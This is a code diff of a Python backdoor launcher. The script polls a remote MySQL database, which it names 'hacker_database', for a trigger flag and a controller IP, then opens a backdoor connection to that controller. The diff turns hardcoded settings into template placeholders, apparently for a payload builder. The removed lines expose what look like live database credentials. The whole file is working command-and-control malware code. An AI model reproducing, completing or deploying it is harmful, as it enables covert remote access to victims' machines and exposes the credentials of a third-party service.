@@ -1,11 +1,11 @@
-from client import Backdoor
+from libs.backdoor.client import Backdoor
 from time import sleep
 from mysql.connector import connect
 from uuid import getnode as getmac
 
 
 # sleep for x seconds before start
-sleep(1)
+sleep('**sleep**')
 
 
 def get_mac_address():
@@ -25,11 +25,11 @@ def get_mac_address():
 
 def read_online_data(program_id):
     hacker_database = connect(
-        host="remotemysql.com",
-        user="lwZaUGfFIB",
-        passwd="zA5RhF4rBc",
-        database='lwZaUGfFIB',
-        port=3306
+        host='**server**',
+        user='**uname**',
+        passwd='**passwd**',
+        database='**dbname**',
+        port='**port**'
     )
     my_cursor = hacker_database.cursor()
 
@@ -56,8 +56,14 @@ def start(p_id, port, sleep_time=60):
     while True:
         try:
             status, host_ip = read_online_data(p_id)
+
+            dyanamic_ip = '**dhost**'
+
+            if not dyanamic_ip:
+                host_ip = '**lhost**'
+
             if status:
-                my_backdoor = Backdoor('192.168.1.2', port)
+                my_backdoor = Backdoor(host_ip, port)
                 my_backdoor.start()
             else:
                 sleep(sleep_time)
@@ -67,8 +73,8 @@ def start(p_id, port, sleep_time=60):
 
 
 # this is the program if of the program
-program_id = 1
-port_value = 4343
-sleep_value = 10
+program_id = '**p_id**'
+port_value = '**lport**'
+sleep_value = '**sleep**'
 
 start(program_id, port_value, sleep_value)
